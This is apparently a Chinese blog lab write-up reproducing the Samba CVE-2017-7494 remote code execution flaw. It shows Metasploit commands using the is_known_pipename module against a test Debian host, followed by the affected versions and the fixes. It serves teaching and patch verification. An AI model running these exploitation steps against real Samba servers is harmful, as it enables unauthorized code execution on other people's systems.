# Samba CVE-2017-7494验证实验 - .Ding - 博客园

> 原文：[https://www.cnblogs.com/meandme/p/11690948.html](https://www.cnblogs.com/meandme/p/11690948.html)

**漏洞简介**

Samba是在Linux和UNIX系统上实现SMB协议的一个软件，不少IoT设备也使用了Samba。2017年5月24日Samba发布了4.6.4版本，修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，攻击者可以利用该漏洞在目标服务器上执行任意代码。2017年5月25日hdm给metasploit提交了该漏洞的exp。2017年5月25日openwrt发布了针对该漏洞的修复补丁，许多IoT设备同样受该漏洞影响。

**测试环境**
攻击机：kali                                    IP：192.168.0.10
靶   机：debian                              IP：192.168.0.20
服务：samba: 4.5

**漏洞验证**

启动Kali执行命令：

msfconsole

msf > use exploit/linux/samba/is_known_pipename

set RHOST 192.168.0.20

run

进入目标系统并查看文件：

cd /  ls
验证完成

**影响版本：**Samba：3.5     <4.6.4     <4.5.10     <4.4.14。4.6.4/4.5.10/4.4.14已修复此漏洞。**修复建议：**
1、临时方案
在smb.conf的[global]节点下增加 nt pipe support = no选项，重新启动samba服务。

2、官方修复
Samba已发布新版本，可通过更新版本解决。**补丁下载**
https://www.samba.org/

**此实验仅供学习参考,不得用于其他任何目的，其他违法行为本人不负任何责任,在此申明!**